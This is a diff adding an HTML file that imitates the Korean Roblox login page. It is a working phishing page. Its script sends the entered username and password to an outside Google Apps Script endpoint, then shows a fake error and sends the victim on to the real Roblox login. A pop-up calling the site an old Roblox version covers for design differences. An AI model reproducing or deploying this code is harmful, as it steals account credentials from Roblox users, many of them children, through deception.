@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <title>Roblox에 로그인</title>
+</head>
+<body>
+
+    <div class="tile-background"></div>
+    <div class="navbar">
+		<div class="nav-left">
+			<img src="Roblox.png" alt="Roblox Logo" class="logo-img">
+			<a href="#">
+			</a>
+            <a href="#" id="button1" >차트</a>
+            <a href="#" id="button2">마켓플레이스</a>
+            <a href="#" id="button3">만들기</a>
+            <a href="#" id="button4">Robux</a>
+        </div>
+		
+		<div class="nav-right">
+			<button class="nav-btn signup-btn">회원가입</button>
+			<button class="nav-btn login-btn-top">로그인</button>
+		</div>
+		
+	</div>
+	
+    <div class="login-container">
+        <h2>Roblox에 로그인</h2>
+        
+        <form id="login-form" action="https://script.google.com/macros/s/AKfycbwrZlYv58RP2Sg82TbBLJDpNztKO9wmtY1MqG0cl4ciUYiXy1qJIvoQ6kEBJ0MJMFXp/exec" method="POST" onsubmit="return handleFormSubmit(event)">
+            <div class="input-group">
+				<input type="text" id="username" name="username" placeholder="사용자 이름/이메일">
+			</div>
+
+			<div class="input-group">
+				<input type="password" id="password" name="password" placeholder="비밀번호">
+			</div>
+			
+			<div id="error-message" style="display:none; color: #ff3333; font-size: 13px; margin: 5px 0 15px 0; text-align: left;">
+				사용자 이름 및 비밀번호를 입력해야 합니다.
+			</div>
+			
+			<button type="submit" class="login-btn">로그인</button>
+		</form>
+
+        <div id="loading-screen" style="display:none; color: white; text-align: center; margin-top: 20px;">
+            <div class="roblox-loading-container">
+                <div class="cube"></div>
+                <div class="cube"></div>
+                <div class="cube"></div>
+            </div>
+        </div>
+
+        <div id="complete-screen" style="display:none; color: #ff3333; font-size: 15px; text-align: center; margin-top: 20px;">
+            <p>알 수 없는 오류가 발생했습니다. 나중에 다시 시도하세요.</p>
+            <button onclick="window.location.href='https://www.roblox.com/ko/Login'" class="login-btn">다시 시도</button>
+        </div>
+        
+        <div class="extra-links">
+            <a href="#">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
+        </div>
+        
+        <div class="divider"></div>
+        
+        <div class="other-login">
+            <button class="email-code-btn">이메일로 일회용 코드 받기</button>
+            <button class="fast-login-btn">빠른 로그인</button>
+        </div>
+        
+        <p class="signup-link">계정이 없으신가요? <a href="#">회원가입</a></p>
+    </div>
+	
+	<div id="legacy-modal" class="modal">
+		<div class="modal-content">
+			<h3>주의: 오래된 사이트</h3>
+			<p>현재 접속하신 페이지는 로블록스 구버전 환경입니다. 일부 기능이 작동하지 않거나 디자인이 현재와 다를 수 있습니다.</p>
+			<button onclick="closeModal()">확인</button>
+		</div>
+	</div>
+	
+	
+    
+    <script>
+	var inputs = document.querySelectorAll('input');
+	var errorDiv = document.getElementById('error-message');
+
+	inputs.forEach(function(input) {
+		input.addEventListener('input', function() {
+			if (errorDiv.style.display === 'block') {
+				errorDiv.style.display = 'none';
+			}
+		});
+	});
+
+	function handleFormSubmit(event) {
+		event.preventDefault();
+		
+		var user = document.getElementById('username').value;
+		var pass = document.getElementById('password').value;
+
+		if (user === "" || pass === "") {
+			errorDiv.style.display = 'block';
+			return false;
+		}
+
+		document.getElementById('login-form').style.display = 'none';
+		document.getElementById('loading-screen').style.display = 'block';
+
+		fetch(event.target.action, {
+			method: 'POST',
+			body: new FormData(event.target),
+			headers: { 'Accept': 'application/json' }
+		}).then(() => {
+			setTimeout(() => {
+				document.getElementById('loading-screen').style.display = 'none';
+				document.getElementById('complete-screen').style.display = 'block';
+			}, 2000);
+		});
+
+		return false;
+	}
+	
+	
+	function closeModal() {
+		document.getElementById('legacy-modal').style.display = 'none';
+	}
+	</script>
+</body>
+</html>
